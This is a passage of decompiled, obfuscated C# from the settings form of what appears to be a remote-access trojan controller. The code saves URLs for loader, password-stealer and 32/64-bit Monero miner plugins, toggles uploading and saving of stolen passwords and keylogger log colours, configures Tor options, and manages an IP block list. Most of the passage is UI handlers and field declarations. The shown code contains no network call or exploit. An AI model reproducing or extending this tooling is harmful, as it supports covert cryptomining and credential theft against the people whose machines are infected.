			Interaction.MsgBox("URL to 64-Bit XMR Miner plugin is invalid!", MsgBoxStyle.Exclamation, Application.ProductName);
			this.vmethod_130().Select();
			this.vmethod_130().BackColor = Color.Red;
			this.vmethod_6().SelectedIndex = 3;
			return;
		}
		try
		{
			Class135.smethod_0().PluginsURLLoader = this.vmethod_126().Text;
			Class135.smethod_0().PluginsURLPws = this.vmethod_44().Text;
			Class135.smethod_0().PluginsURLXMR = this.vmethod_42().Text;
			Class135.smethod_0().PluginsURLXMR64 = this.vmethod_130().Text;
			Class135.smethod_0().PluginsUpload = this.vmethod_114().Checked;
			Class135.smethod_0().PluginsSavePws = this.vmethod_262().Checked;
			Class135.smethod_0().Save();
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Error while saving settings!\r\nError: " + ex.Message, MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CF2 RID: 3314 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_57(object sender, EventArgs e)
	{
	}

	// Token: 0x06000CF3 RID: 3315 RVA: 0x00065958 File Offset: 0x00063B58
	private void method_58(object sender, EventArgs e)
	{
		try
		{
			Class135.smethod_0().ConNotifications = this.vmethod_190().Checked;
			Class135.smethod_0().Gridlines = this.vmethod_188().Checked;
			Class135.smethod_0().ConKlgColors = this.vmethod_200().Checked;
			Class135.smethod_0().SettingsTray = this.vmethod_258().Checked;
			Class135.smethod_0().UIThumbnails = this.vmethod_264().Checked;
			Class135.smethod_0().Save();
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Error while saving settings!\r\nError: " + ex.Message, MsgBoxStyle.Critical, Application.ProductName);
			this.vmethod_192().Enabled = true;
			return;
		}
		Class136.smethod_8(this.vmethod_188().Checked);
		Class130.fMain_0.method_5(this.vmethod_264().Checked);
		bool @checked = this.vmethod_264().Checked;
		new Thread(new ThreadStart(new Class136.Class137
		{
			bool_0 = @checked
		}._Lambda$__0)).Start();
		Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CF4 RID: 3316 RVA: 0x00007EE9 File Offset: 0x000060E9
	private void method_59(object sender, EventArgs e)
	{
		Interaction.MsgBox("Enabling this feature will apply colors to titles and timestamps.\r\n\r\nWarning: You may wish to disable this feature if logs are loading slow.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CF5 RID: 3317 RVA: 0x00007EFD File Offset: 0x000060FD
	private void method_60(object sender, EventArgs e)
	{
		Interaction.MsgBox("If set, Tor will tell the kernel to attempt to shrink the buffers for all sockets to the size specified in constrained socket size. This is useful for virtual servers and other environments where system level TCP buffers may be limited. If you’re on a virtual server, and you encounter the\"Error creating network socket: No Buffer space available\" message, you are likely experiencing this problem.\r\n\r\nThe preferred solution is to have the admin increase the buffer pool for the host itself via /proc/sys/net/ipv4/tcp_mem or equivalent facility; this configuration option is a second-resort.\r\n\r\nNote: You should not enable this feature unless you encounter the \"no buffer space available\" issue. Reducing the TCP buffers affects window size for the TCP stream and will reduce throughput in proportion to round trip time on long paths.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CF6 RID: 3318 RVA: 0x00007F11 File Offset: 0x00006111
	private void method_61(object sender, EventArgs e)
	{
		Interaction.MsgBox("When constrained sockets is enabled the receive and transmit buffers for all sockets will be set to this limit.\r\nMust be a value between 2048 and 262144, in 1024 byte increments. Default of 8192 is recommended.", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CF7 RID: 3319 RVA: 0x00065A88 File Offset: 0x00063C88
	private void method_62(object sender, EventArgs e)
	{
		if (!Versioned.IsNumeric(this.vmethod_222().Text) | Conversion.Val(this.vmethod_222().Text) < 2048.0 | Conversion.Val(this.vmethod_222().Text) > 8192.0 | Conversion.Val(this.vmethod_222().Text) % 1024.0 != 0.0)
		{
			this.vmethod_222().BackColor = Color.Red;
			return;
		}
		this.vmethod_222().BackColor = Color.White;
	}

	// Token: 0x06000CF8 RID: 3320 RVA: 0x00007F25 File Offset: 0x00006125
	private void method_63(object sender, EventArgs e)
	{
		this.vmethod_222().Enabled = this.vmethod_216().Checked;
		this.vmethod_224().Enabled = this.vmethod_216().Checked;
	}

	// Token: 0x06000CF9 RID: 3321 RVA: 0x00065B2C File Offset: 0x00063D2C
	private void method_64(object sender, EventArgs e)
	{
		if (this.vmethod_216().Checked && (!Versioned.IsNumeric(this.vmethod_222().Text) | Conversion.Val(this.vmethod_222().Text) < 2048.0 | Conversion.Val(this.vmethod_222().Text) > 8192.0 | Conversion.Val(this.vmethod_222().Text) % 1024.0 != 0.0))
		{
			Interaction.MsgBox("Invalid constrained socket size!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		try
		{
			Class135.smethod_0().TorDisableCaching = this.vmethod_206().Checked;
			Class135.smethod_0().TorAvoidDiskWrites = this.vmethod_210().Checked;
			Class135.smethod_0().TorRejectSingleHop = this.vmethod_212().Checked;
			Class135.smethod_0().TorNoExec = this.vmethod_218().Checked;
			Class135.smethod_0().TorUseConstrainedSockets = this.vmethod_216().Checked;
			Class135.smethod_0().TorConstrainedSocketSize = this.vmethod_222().Text;
			Class135.smethod_0().Save();
		}
		catch (Exception ex)
		{
			Interaction.MsgBox("Error while saving settings!\r\nError: " + ex.Message, MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		Interaction.MsgBox("Settings successfully saved!", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CFA RID: 3322 RVA: 0x00007F53 File Offset: 0x00006153
	private void method_65(object sender, EventArgs e)
	{
		this.vmethod_18().PasswordChar = '\0';
		this.vmethod_230().Visible = true;
		this.vmethod_228().Visible = false;
	}

	// Token: 0x06000CFB RID: 3323 RVA: 0x00007F79 File Offset: 0x00006179
	private void method_66(object sender, EventArgs e)
	{
		this.vmethod_18().PasswordChar = '*';
		this.vmethod_228().Visible = true;
		this.vmethod_230().Visible = false;
	}

	// Token: 0x06000CFC RID: 3324 RVA: 0x00007FA0 File Offset: 0x000061A0
	private void method_67(object sender, EventArgs e)
	{
		Interaction.MsgBox("Connections from IP addresses in this list will be rejected.\r\n\r\nYou may also add ranges by adding * at the end of the IP.\r\nExample of blocking IP range 111.222.333.1 to 111.222.333.255, simply add 111.222.333.*", MsgBoxStyle.Information, Application.ProductName);
	}

	// Token: 0x06000CFD RID: 3325 RVA: 0x00065CAC File Offset: 0x00063EAC
	private void method_68(object sender, EventArgs e)
	{
		if (!Directory.Exists(Application.StartupPath + "\\data\\settings"))
		{
			Directory.CreateDirectory(Application.StartupPath + "\\data\\settings");
		}
		checked
		{
			if (this.vmethod_244().Items.Count > 0)
			{
				string text = string.Empty;
				int num = this.vmethod_244().Items.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					text = Conversions.ToString(Operators.ConcatenateObject(text, Operators.ConcatenateObject(this.vmethod_244().Items[i].Text, Interaction.IIf(i < this.vmethod_244().Items.Count - 1, "\r\n", string.Empty))));
				}
				string text2 = Application.StartupPath + "\\data\\settings\\firewall.txt";
				byte[] bytes = Encoding.UTF8.GetBytes(text);
				bool flag = true;
				byte[] byte_ = bytes;
				string string_ = text2;
				Class136.Class142 @class = new Class136.Class142();
				@class.string_0 = string_;
				@class.byte_0 = byte_;
				@class.bool_0 = false;
				try
				{
					if (flag)
					{
						new Thread(new ThreadStart(@class._Lambda$__0)).Start();
					}
					else
					{
						Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
					}
				}
				catch (Exception ex)
				{
				}
				Interaction.MsgBox("Firewall list successfully saved!", MsgBoxStyle.Information, Application.ProductName);
				return;
			}
			File.Delete(Application.StartupPath + "\\data\\settings\\firewall.txt");
			Interaction.MsgBox("Firewall list empty!", MsgBoxStyle.Information, Application.ProductName);
		}
	}

	// Token: 0x06000CFE RID: 3326 RVA: 0x00065E3C File Offset: 0x0006403C
	private void method_69(object sender, EventArgs e)
	{
		if (this.vmethod_238().TextLength < 3)
		{
			Interaction.MsgBox("Invalid IP!", MsgBoxStyle.Critical, Application.ProductName);
			return;
		}
		cFWIP cFWIP = new cFWIP();
		cFWIP.IP = this.vmethod_238().Text;
		cFWIP.ATTEMPTS = Conversions.ToString(0);
		Class130.concurrentQueue_0.Enqueue(cFWIP);
		try
		{
			Class130.concurrentDictionary_9.TryAdd(this.vmethod_238().Text, cFWIP);
		}
		catch (Exception ex)
		{
		}
		this.vmethod_238().Text = string.Empty;
	}

	// Token: 0x06000CFF RID: 3327 RVA: 0x00065EE0 File Offset: 0x000640E0
	public void method_70()
	{
		if (this.vmethod_244().InvokeRequired)
		{
			this.vmethod_244().Invoke(new fSettings.Delegate58(this.method_70), new object[0]);
			return;
		}
		if (Class130.concurrentQueue_0.Count > 0)
		{
			this.vmethod_244().AddObjects(Class130.concurrentQueue_0.ToList<cFWIP>());
			Class130.concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
			this.vmethod_244().Update();
		}
	}

	// Token: 0x06000D00 RID: 3328 RVA: 0x00065F50 File Offset: 0x00064150
	public void method_71()
	{
		if (this.vmethod_244().InvokeRequired)
		{
			this.vmethod_244().Invoke(new fSettings.Delegate62(this.method_71), new object[0]);
			return;
		}
		if (Class130.concurrentQueue_1.Count > 0)
		{
			this.vmethod_244().RefreshObjects(Class130.concurrentQueue_1.ToList<cFWIP>());
			Class130.concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
			this.vmethod_244().Update();
		}
	}

	// Token: 0x06000D01 RID: 3329 RVA: 0x00065FC0 File Offset: 0x000641C0
	public void method_72()
	{
		if (this.vmethod_244().InvokeRequired)
		{
			this.vmethod_244().Invoke(new fSettings.Delegate60(this.method_72), new object[0]);
			return;
		}
		if (Class130.concurrentQueue_2.Count > 0)
		{
			this.vmethod_244().RemoveObjects(Class130.concurrentQueue_2.ToList<cFWIP>());
			Class130.concurrentQueue_0 = new ConcurrentQueue<cFWIP>();
			this.vmethod_244().Update();
		}
	}

	// Token: 0x06000D02 RID: 3330 RVA: 0x00007FB4 File Offset: 0x000061B4
	private void method_73(object sender, DoWorkEventArgs e)
	{
		for (;;)
		{
			this.method_70();
			this.method_71();
			this.method_72();
			Thread.Sleep(1000);
		}
	}

	// Token: 0x06000D03 RID: 3331 RVA: 0x00066030 File Offset: 0x00064230
	private void method_74(object sender, EventArgs e)
	{
		try
		{
			foreach (object obj in this.vmethod_244().SelectedObjects)
			{
				cFWIP cFWIP = (cFWIP)obj;
				Class130.concurrentDictionary_9.TryRemove(cFWIP.IP, out cFWIP);
				Class130.concurrentQueue_2.Enqueue(cFWIP);
			}
		}
		finally
		{
			IEnumerator enumerator;
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	// Token: 0x06000D04 RID: 3332 RVA: 0x000660A8 File Offset: 0x000642A8
	private void method_75(object sender, EventArgs e)
	{
		checked
		{
			if (File.Exists(Application.StartupPath + "\\data\\settings\\firewall.txt"))
			{
				this.vmethod_244().ClearObjects();
				Class130.concurrentDictionary_9.Clear();
				string text = Application.StartupPath + "\\data\\settings\\firewall.txt";
				string[] array = Strings.Split(Class136.smethod_14(ref text), "\r\n", -1, CompareMethod.Text);
				array = Class136.smethod_3(array);
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					if (array[i].Length > 0)
					{
						cFWIP cFWIP = new cFWIP();
						cFWIP.IP = array[i];
						cFWIP.ATTEMPTS = Conversions.ToString(0);
						Class130.concurrentQueue_0.Enqueue(cFWIP);
						try
						{
							Class130.concurrentDictionary_9.TryAdd(array[i], cFWIP);
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
			if (!this.vmethod_250().IsBusy)
			{
				this.vmethod_250().RunWorkerAsync();
			}
		}
	}

	// Token: 0x04000464 RID: 1124
	private Button button_0;

	// Token: 0x04000465 RID: 1125
	private Button button_1;

	// Token: 0x04000466 RID: 1126
	private Splitter splitter_0;

	// Token: 0x04000467 RID: 1127
	private TabControl tabControl_0;

	// Token: 0x04000468 RID: 1128
	private TabPage tabPage_0;

	// Token: 0x04000469 RID: 1129
	private Label label_0;

	// Token: 0x0400046A RID: 1130
	private Label label_1;

	// Token: 0x0400046B RID: 1131
	private TextBox textBox_0;

	// Token: 0x0400046C RID: 1132
	private CheckBox checkBox_0;

	// Token: 0x0400046D RID: 1133
	private TextBox textBox_1;

	// Token: 0x0400046E RID: 1134
	private Label label_2;

	// Token: 0x0400046F RID: 1135
	private TextBox textBox_2;

	// Token: 0x04000470 RID: 1136
	private Label label_3;

	// Token: 0x04000471 RID: 1137
	private TabPage tabPage_1;

	// Token: 0x04000472 RID: 1138
	private TextBox textBox_3;

	// Token: 0x04000473 RID: 1139
	private Label label_4;

	// Token: 0x04000474 RID: 1140
	private Label label_5;

	// Token: 0x04000475 RID: 1141
	private PictureBox pictureBox_0;

	// Token: 0x04000476 RID: 1142
	private TabPage tabPage_2;

	// Token: 0x04000477 RID: 1143
	private Label label_6;

	// Token: 0x04000478 RID: 1144
	private Label label_7;

	// Token: 0x04000479 RID: 1145
	private TextBox textBox_4;

	// Token: 0x0400047A RID: 1146
	private TextBox textBox_5;

	// Token: 0x0400047B RID: 1147
	private Label label_8;

	// Token: 0x0400047C RID: 1148
	private PictureBox pictureBox_1;

	// Token: 0x0400047D RID: 1149
	private Label label_9;

	// Token: 0x0400047E RID: 1150
	private TextBox textBox_6;

	// Token: 0x0400047F RID: 1151
	private Label label_10;

	// Token: 0x04000480 RID: 1152
	private TabPage tabPage_3;

	// Token: 0x04000481 RID: 1153
	private PictureBox pictureBox_2;

	// Token: 0x04000482 RID: 1154
	private CheckBox checkBox_1;

	// Token: 0x04000483 RID: 1155
	private RadioButton radioButton_0;

	// Token: 0x04000484 RID: 1156
	private Label label_11;

	// Token: 0x04000485 RID: 1157
	private RadioButton radioButton_1;

	// Token: 0x04000486 RID: 1158
	private Label label_12;

	// Token: 0x04000487 RID: 1159
	private Label label_13;

	// Token: 0x04000488 RID: 1160
	private TrackBar trackBar_0;

	// Token: 0x04000489 RID: 1161
	private Label label_14;

	// Token: 0x0400048A RID: 1162
	private TextBox textBox_7;

	// Token: 0x0400048B RID: 1163
	private Label label_15;

	// Token: 0x0400048C RID: 1164
	private Label label_16;

	// Token: 0x0400048D RID: 1165
	private TextBox textBox_8;

	// Token: 0x0400048E RID: 1166
	private Label label_17;

	// Token: 0x0400048F RID: 1167
	private TextBox textBox_9;

	// Token: 0x04000490 RID: 1168
	private Label label_18;

	// Token: 0x04000491 RID: 1169
	private Label label_19;

	// Token: 0x04000492 RID: 1170
	private TextBox textBox_10;

	// Token: 0x04000493 RID: 1171
	private ComboBox comboBox_0;

	// Token: 0x04000494 RID: 1172
	private Label label_20;

	// Token: 0x04000495 RID: 1173
	private ComboBox comboBox_1;

	// Token: 0x04000496 RID: 1174
	private Label label_21;

	// Token: 0x04000497 RID: 1175
	private CheckBox checkBox_2;

	// Token: 0x04000498 RID: 1176
	private TrackBar trackBar_1;

	// Token: 0x04000499 RID: 1177
	private Label label_22;

	// Token: 0x0400049A RID: 1178
	private Label label_23;

	// Token: 0x0400049B RID: 1179
	private CheckBox checkBox_3;

	// Token: 0x0400049C RID: 1180
	private PictureBox pictureBox_3;

	// Token: 0x0400049D RID: 1181
	private CheckBox checkBox_4;

	// Token: 0x0400049E RID: 1182
	private PictureBox pictureBox_4;

	// Token: 0x0400049F RID: 1183
	private Label label_24;

	// Token: 0x040004A0 RID: 1184
	private TextBox textBox_11;

	// Token: 0x040004A1 RID: 1185
	private PictureBox pictureBox_5;

	// Token: 0x040004A2 RID: 1186
	private Label label_25;

	// Token: 0x040004A3 RID: 1187
	private TextBox textBox_12;

	// Token: 0x040004A4 RID: 1188
	private Label label_26;

	// Token: 0x040004A5 RID: 1189
	private TextBox textBox_13;

	// Token: 0x040004A6 RID: 1190
	private Label label_27;

	// Token: 0x040004A7 RID: 1191
	private TextBox textBox_14;

	// Token: 0x040004A8 RID: 1192
	private Label label_28;

	// Token: 0x040004A9 RID: 1193
	private CheckBox checkBox_5;

	// Token: 0x040004AA RID: 1194
	private TextBox textBox_15;

	// Token: 0x040004AB RID: 1195
	private Label label_29;

	// Token: 0x040004AC RID: 1196
	private PictureBox pictureBox_6;

	// Token: 0x040004AD RID: 1197
	private PictureBox pictureBox_7;

	// Token: 0x040004AE RID: 1198
	private Label label_30;

	// Token: 0x040004AF RID: 1199
	private TextBox textBox_16;

	// Token: 0x040004B0 RID: 1200
	private Label label_31;

	// Token: 0x040004B1 RID: 1201
	private Label label_32;

	// Token: 0x040004B2 RID: 1202
	private TextBox textBox_17;

	// Token: 0x040004B3 RID: 1203
	private Label label_33;

	// Token: 0x040004B4 RID: 1204
	private PictureBox pictureBox_8;

	// Token: 0x040004B5 RID: 1205
	private CheckBox checkBox_6;

	// Token: 0x040004B6 RID: 1206
	private PictureBox pictureBox_9;

	// Token: 0x040004B7 RID: 1207
	private RadioButton radioButton_2;

	// Token: 0x040004B8 RID: 1208
	private RadioButton radioButton_3;

	// Token: 0x040004B9 RID: 1209
	private VisualButton visualButton_0;

	// Token: 0x040004BA RID: 1210
	private VisualButton visualButton_1;

	// Token: 0x040004BB RID: 1211
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040004BC RID: 1212
	private VisualButton visualButton_2;

	// Token: 0x040004BD RID: 1213
	private VisualButton visualButton_3;

	// Token: 0x040004BE RID: 1214
	private VisualButton visualButton_4;

	// Token: 0x040004BF RID: 1215
	private VisualButton visualButton_5;

	// Token: 0x040004C0 RID: 1216
	private VisualButton visualButton_6;

	// Token: 0x040004C1 RID: 1217
	private TabPage tabPage_4;

	// Token: 0x040004C2 RID: 1218
	private CheckBox checkBox_7;

	// Token: 0x040004C3 RID: 1219
	private CheckBox checkBox_8;

	// Token: 0x040004C4 RID: 1220
	private VisualButton visualButton_7;

	// Token: 0x040004C5 RID: 1221
	private PictureBox pictureBox_10;

	// Token: 0x040004C6 RID: 1222
	private Label label_34;

	// Token: 0x040004C7 RID: 1223
	private Label label_35;

	// Token: 0x040004C8 RID: 1224
	private CheckBox checkBox_9;

	// Token: 0x040004C9 RID: 1225
	private TabPage tabPage_5;

	// Token: 0x040004CA RID: 1226
	private Label label_36;

	// Token: 0x040004CB RID: 1227
	private CheckBox checkBox_10;

	// Token: 0x040004CC RID: 1228
	private VisualButton visualButton_8;

	// Token: 0x040004CD RID: 1229
	private CheckBox checkBox_11;

	// Token: 0x040004CE RID: 1230
	private CheckBox checkBox_12;

	// Token: 0x040004CF RID: 1231
	private PictureBox pictureBox_11;

	// Token: 0x040004D0 RID: 1232
	private CheckBox checkBox_13;

	// Token: 0x040004D1 RID: 1233
	private CheckBox checkBox_14;

	// Token: 0x040004D2 RID: 1234
	private PictureBox pictureBox_12;

	// Token: 0x040004D3 RID: 1235
	private TextBox textBox_18;

	// Token: 0x040004D4 RID: 1236
	private Label label_37;

	// Token: 0x040004D5 RID: 1237
	private System.Windows.Forms.Timer timer_1;

	// Token: 0x040004D6 RID: 1238
	private PictureBox pictureBox_13;

	// Token: 0x040004D7 RID: 1239
	private PictureBox pictureBox_14;

	// Token: 0x040004D8 RID: 1240
	private TabPage tabPage_6;

	// Token: 0x040004D9 RID: 1241
	private VisualButton visualButton_9;

	// Token: 0x040004DA RID: 1242
	private VisualButton visualButton_10;

	// Token: 0x040004DB RID: 1243
	private TextBox textBox_19;

	// Token: 0x040004DC RID: 1244
	private Label label_38;

	// Token: 0x040004DD RID: 1245
	private PictureBox pictureBox_15;

	// Token: 0x040004DE RID: 1246
	private FastObjectListView fastObjectListView_0;

	// Token: 0x040004DF RID: 1247
	private OLVColumn olvcolumn_0;

	// Token: 0x040004E0 RID: 1248
	private OLVColumn olvcolumn_1;

	// Token: 0x040004E1 RID: 1249
	private BackgroundWorker backgroundWorker_0;

	// Token: 0x040004E2 RID: 1250
	private ContextMenuStrip contextMenuStrip_0;

	// Token: 0x040004E3 RID: 1251
	private ToolStripMenuItem toolStripMenuItem_0;

	// Token: 0x040004E4 RID: 1252
	private VisualButton visualButton_11;

	// Token: 0x040004E5 RID: 1253
	private CheckBox checkBox_15;

	// Token: 0x040004E6 RID: 1254
	private Label label_39;

	// Token: 0x040004E7 RID: 1255
	private CheckBox checkBox_16;

	// Token: 0x040004E8 RID: 1256
	private CheckBox checkBox_17;

	// Token: 0x040004E9 RID: 1257
	private fMain fMain_0;

	// Token: 0x020000F0 RID: 240
	// (Invoke) Token: 0x06000D0C RID: 3340
	private delegate void Delegate58();

	// Token: 0x020000F1 RID: 241
	// (Invoke) Token: 0x06000D10 RID: 3344
	private delegate void Delegate59();

	// Token: 0x020000F2 RID: 242
	// (Invoke) Token: 0x06000D14 RID: 3348
	private delegate void Delegate60();

	// Token: 0x020000F3 RID: 243
	// (Invoke) Token: 0x06000D18 RID: 3352
	public delegate void GDelegate3(bool bool_0);

	// Token: 0x020000F4 RID: 244
	// (Invoke) Token: 0x06000D1C RID: 3356
	public delegate void GDelegate4(bool bool_0);

	// Token: 0x020000F5 RID: 245
	// (Invoke) Token: 0x06000D20 RID: 3360
	private delegate void Delegate61();

	// Token: 0x020000F6 RID: 246
	// (Invoke) Token: 0x06000D24 RID: 3364
	private delegate void Delegate62();
}
